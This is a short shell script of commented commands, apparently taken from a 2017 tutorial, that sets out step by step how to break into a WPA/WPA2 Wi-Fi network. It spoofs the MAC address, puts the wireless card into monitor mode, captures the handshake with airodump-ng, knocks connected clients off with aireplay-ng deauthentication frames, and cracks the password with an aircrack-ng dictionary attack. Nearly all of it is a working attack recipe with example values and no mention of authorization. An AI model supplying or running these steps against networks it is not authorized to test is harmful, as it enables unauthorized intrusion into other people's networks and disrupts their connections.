# wifi_hacking_command_sequence-
# Execute dictionary attack to Wi-Fi Network
# 
# http://ourcodeworld.com/articles/read/407/how-to-hack-a-wi-fi-network-wpa-wpa2-through-a-dictionary-attack-with-kali-linux
# March - 2017


# List interfaces (sh)
ifconfig

# Disable interface to change the MAC address
ifconfig wlan0 down

# Spoof MAC address to 00:11:22:33:44:55
macchanger -m 00:11:22:33:44:55 wlan0

# Enable interface again :)
ifconfig wlan0 up

# Kill any services 
airmon-ng check kill

# Start interface in monitor mode
airmon-ng start wlan0

# Now from the previous step copy the name of the interface in monitor mode
# Example of output previous step: monitor mode vif enabled for [phy]wlan0 on [phy0]wlan0mon
# Name = wlan0mon

# Dump available Wi-Fi networks
airodump-ng wlan0mon

# The previous step should output a table like the following:

#|BSSID             |PWR |Beacons | #Data | #/s |CH |MB   |ENC  |CIPHER |AUTH  | ESSID            |
#|E0:98:61:47:BD:E2 |-34 |38      | 0     | 0   |1  |54e. |WPA2 |CCMP   |PSK   | The network name |

# You should copy this information as you will need the information of the network to execute some
# commands that require those values as arguments

# Copy WPA handshake with the following command
airodump-ng -c [channel] --bssid [BSSID] -w [path/to/folder/output] [interface-name-in-monitor-mode]
# Example: airodump-ng -c 1 --bssid E0:98:61:47:BD:E2 -w /root/hacking/ wlan0mon
# Note: this process can take a lot of time, so be patient
# Once the following message appears:
# WPA Handshake [BSSID OF THE DEVICE, EXAMPLE E0:98:61:47:BD:E2]
# You can proceed with the next step and stop the current command as it will still running
# The .cap files should be now in the [path/to/folder/output] 


# Inject frames to Ten authentication packages
# Recommend numberofpackages = 10
aireplay-ng -0 [number-of-packages] -a [BSSID] [interface-name-in-monitor-mode]
# Example: aireplay-ng -0 10 -a E0:98:61:47:BD:E2 wlan0mon

# Start dictionary attack using the WPA Handshake previously downloaded and 

aircrack-ng -a2 -b [BSSID] -w [path to dictionary] [path to .cap files of handshake]
# Example: aircrack-ng -a2 -b E0:98:61:47:BD:E2 -w /root/hacking/passwords.txt /root/hacking/*.cap

# That's all !
